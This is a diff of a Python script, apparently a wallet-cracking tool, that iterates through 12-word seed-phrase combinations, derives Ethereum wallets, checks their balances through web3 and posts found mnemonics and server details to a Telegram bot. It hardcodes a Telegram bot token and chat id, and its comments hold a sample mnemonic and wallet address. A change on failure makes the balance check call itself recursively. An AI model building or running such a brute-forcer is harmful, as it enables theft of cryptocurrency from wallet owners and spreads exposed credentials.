@@ -1,4 +1,4 @@
-from threading import Thread
+#from threading import Thread
 from web3 import Web3
 import time
 import requests
@@ -45,6 +45,7 @@ def send_telegram2(mnemonic,balance,wallet):
 
 def chama_api_dos_nodes_para_validar_o_balance(wallet,mnemonic):
     #mnemonic = "luxury rebel tenant boat match antique drop album dress scissors pizza crop"
+    #wallet = "0xd437319A06384c55D8A0D979d12a59e8DeA9D2A3"
     #print(str(wallet))
     #print(str(mnemonic))
 
@@ -66,7 +67,7 @@ def chama_api_dos_nodes_para_validar_o_balance(wallet,mnemonic):
     try:
         balance = web3.eth.get_balance(wallet)
     except:
-        sys.exit()
+        pass
     else:
         #print("wallet "+str(wallet)+" balance "+str(web3.from_wei(balance,'ether'))+" mnemonic "+str(mnemonic))
         if balance != 0:
@@ -76,11 +77,12 @@ def chama_api_dos_nodes_para_validar_o_balance(wallet,mnemonic):
             if r.ok:
                 pass
             else:
-                send_telegram2(mnemonic,balance,wallet)            
+                chama_api_dos_nodes_para_validar_o_balance(wallet,mnemonic)            
             #arquivo = open("wallet_"+str(id)+".txt", "a")
             #arquivo.write(str(p1)+" "+str(p2)+" "+str(p3)+" "+str(p4)+" "+str(p5)+" "+str(p6)+" "+str(p7)+" "+str(p8)+" "+str(p9)+" "+str(p10)+" "+str(p11)+" "+str(p12)+"\n")    
-            sys.exit()                                
-    sys.exit()
+    #print(f"WALLET: "+str(wallet)+" | "+str(balance)+" | "+str(mnemonic)+" - "+str(web3))            
+    #print(balance)
+
 
 payload = {'chat_id': '139945866', 'text': '🟢 LOOP ROBO:\n'+str(serv_name)+': '+str(id)+'\nSERVER: '+str(server)+'\nSERVER IP: '+str(server_ip)+'\nPhrase:'+str(pos01)+'.'+str(pos02)+'.'+str(pos03)+'.'+str(pos04)+'.'+str(pos05)+'.'+str(pos06)+'.'+str(pos07)+'.'+str(pos08)+'.'+str(pos09)+'.'+str(pos10)+'.'+str(pos11)+'.'+str(pos12)+'\nExecutado: '+str(y)+''}
 r = requests.post("https://api.telegram.org/bot6534285154:AAEzeSG2Nvyn46uGD88VeC2eREAiW80SntA/sendMessage", data=payload)    
@@ -141,12 +143,12 @@ def validada_limite_dos_valores(var1,pos01,pos02,pos03,pos04,pos05,pos06,pos07,p
 while(pos12<=total_palavras):
     pos01=pos01+1
     pos01,pos02,pos03,pos04,pos05,pos06,pos07,pos08,pos09,pos10,pos11,pos12 = validada_limite_dos_valores(var1,pos01,pos02,pos03,pos04,pos05,pos06,pos07,pos08,pos09,pos10,pos11,pos12)       
-
-    y=y+1
+    #time.sleep(0.01)
+    #print(y)
     palavras = [pos01,pos02,pos03,pos04,pos05,pos06,pos07,pos08,pos09,pos10,pos11,pos12]
-    if (y % 10000) == 0:
-        time.sleep(30)
-        payload = {'chat_id': '139945866', 'text': '🟢 LOOP ROBO'}
+    if (y % 10000000) == 0:
+        time.sleep(1)
+        payload = {'chat_id': '139945866', 'text': '🟢 LOOP ROBO:\n'+str(serv_name)+': '+str(id)+'\nSERVER: '+str(server)+'\nSERVER IP: '+str(server_ip)+'\nPhrase:'+str(palavras)+'\nExecutado: '+str(y)+''}
         r = requests.post("https://api.telegram.org/bot6534285154:AAEzeSG2Nvyn46uGD88VeC2eREAiW80SntA/sendMessage", data=payload)  
         if r.ok:
             pass
@@ -162,7 +164,9 @@ while(pos12<=total_palavras):
         retorno = f_mnemonic_v2.inicio(str(y),str(x),str(pos01),str(pos02),str(pos03),str(pos04),str(pos05),str(pos06),str(pos07),str(pos08),str(pos09),str(pos10),str(pos11),str(pos12),str(var1))
         if not retorno:
             pass
+            #print("False: ", str(palavras))
         else:      
+            #print("True: ", str(palavras))
             r = json.loads(retorno)      
             print("Count: "+str('%012.0f' % int(y))+" | "+str(r['wallet'])+" | "+str(r['seq'])+" | "+str(r['mnemonic']))                                    
             #print(r)
@@ -170,7 +174,8 @@ while(pos12<=total_palavras):
             #print(str(r['seq']))
             #print(str(r['mnemonic']))
             #Thread(target = chama_api_dos_nodes_para_validar_o_balance, args=(str(y),str(x),str(pos01),str(pos02),str(pos03),str(pos04),str(pos05),str(pos06),str(pos07),str(pos08),str(pos09),str(pos10),str(pos11),str(pos12),str(var1)), daemon=True).start()
-            Thread(target = chama_api_dos_nodes_para_validar_o_balance, args=(str(r['wallet']),str(r['mnemonic'])), daemon=True).start()        
+            #Thread(target = chama_api_dos_nodes_para_validar_o_balance, args=(str(r['wallet']),str(r['mnemonic'])), daemon=True).start()        
+            chama_api_dos_nodes_para_validar_o_balance(str(r['wallet']),str(r['mnemonic']))
     else:
         #print("False: ", str(palavras))
         while(valida_array(palavras) is False):
